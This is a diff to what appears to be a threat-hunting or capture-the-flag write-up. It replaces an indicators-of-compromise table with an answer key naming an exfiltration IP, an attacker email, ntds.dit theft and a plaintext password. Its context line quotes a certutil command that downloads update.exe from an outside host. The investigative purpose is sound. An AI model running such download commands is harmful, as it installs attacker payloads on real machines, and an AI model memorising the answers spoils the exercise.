@@ -398,16 +398,20 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 # Indicators of Compromise (IOCs)
 
-| Type                | Value                                                 |
-| ------------------- | ----------------------------------------------------- |
-| Domain              | sync.cloud-endpoint.net                               |
-| IP Address          | 66.203.125.15                                         |
-| Email               | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
-| Tool                | rclone.exe                                            |
-| Tool                | update.exe                                            |
-| Cmdlet              | Compress-Archive                                      |
-| Archive             | gamedev.zip                                           |
-| Sensitive Directory | C:\GameDev                                            |
+
+```md id="q9ofkq"
+| Question | Answer |
+|---|---|
+| 1. Stolen Data Source Directory | C:\GameDev |
+| 2. Exfiltration Destination | MEGA |
+| 3. Attacker Email Attribution | jwilson.vhr@proton.me |
+| 4. Active Directory Credential Database Theft | ntds.dit |
+| 5. Exfiltration Destination IP | 66.203.125.15 |
+| 6. Plaintext Credential Exposure | Summer2024! |
+| 7. Archive Method | Compress-Archive |
+| 8. Staging Infrastructure Discovery | sync.cloud-endpoint.net |
+```
+
 
 ---
 
